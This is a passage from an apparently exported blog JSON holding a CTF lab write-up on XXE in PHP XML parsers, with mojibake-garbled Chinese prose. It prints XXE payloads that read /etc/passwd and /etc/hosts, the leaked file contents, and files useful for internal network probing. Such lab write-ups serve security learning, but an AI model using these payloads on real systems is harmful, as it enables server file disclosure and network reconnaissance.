ç¤ºä¾‹ï¼šä½¿ç”¨SimpleXMLElementç±»è§£æbody\nâ””â”€â”€ simplexml_load_string.php # ç¤ºä¾‹ï¼šä½¿ç”¨simplexml_load_stringå‡½æ•°è§£æbody</code></pre><p><code>dom.php</code>ã€<code>SimpleXMLElement.php</code>ã€<code>simplexml_load_string.php</code> å‡å¯è§¦å‘XXEæ¼æ´</p>\n<p><strong>requests:</strong></p>\n<pre><code>GET /SimpleXMLElement.php HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nCookie: __cfduid=d592021b2a53c58ae9e47dc1c1d5fbc361564715522; track_uuid=33b0bc28-89ab-4a63-da5c-d1b3ce520ac0\nUpgrade-Insecure-Requests: 1\nX-Forwarded-For: 127.0.0.1\nCache-Control: max-age=0\nContent-Length: 163\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>HTTP/1.1 200 OK\nHost: node3.buuoj.cn:26506\nConnection: close\nX-Powered-By: PHP/7.0.30\nContent-type: text/html; charset=UTF-8\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false</code></pre><p>è¿˜å¯ä»¥è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼š</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;\n\n127.0.0.1    localhost\n::1    localhost ip6-localhost ip6-loopback\nfe00::0    ip6-localnet\nff00::0    ip6-mcastprefix\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n174.0.56.234    283819a6c89d</code></pre><p>å¸¸ç”¨çš„å†…ç½‘ IP æ–‡ä»¶<code>/etc/hosts</code> ã€ <code>/proc/net/arp</code> ã€ <code>/proc/net/fib_trie</code></p>\n","text":"BUUCTF  wpWEBWarm upæŸ¥çœ‹æºç  &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)       ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}]}